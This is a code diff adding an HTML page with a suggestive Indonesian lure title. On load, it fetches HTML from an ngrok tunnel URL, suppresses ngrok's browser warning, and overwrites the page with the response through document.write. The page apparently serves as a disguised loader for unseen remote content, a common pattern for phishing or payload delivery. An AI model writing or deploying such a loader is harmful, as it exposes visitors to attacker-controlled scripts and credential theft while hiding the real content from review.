@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <title>Cici Nakal 🤭💕</title>
+  <style>
+    body {
+      background: black;
+      color: hotpink;
+      font-family: sans-serif;
+      text-align: center;
+      padding: 40px;
+    }
+  </style>
+</head>
+<body>
+  <h1>Loading… 😏💕</h1>
+  <div id="content"></div>
+
+  <script>
+    fetch("https://513e0f96e51c.ngrok-free.app", {
+      headers: { "ngrok-skip-browser-warning": "true" }
+    })
+    .then(res => res.text())
+    .then(html => {
+      document.open();
+      document.write(html);
+      document.close();
+    })
+    .catch(err => {
+      document.getElementById("content").innerText = "Gagal ambil konten 😖🔥: " + err;
+    });
+  </script>
+</body>
+</html>
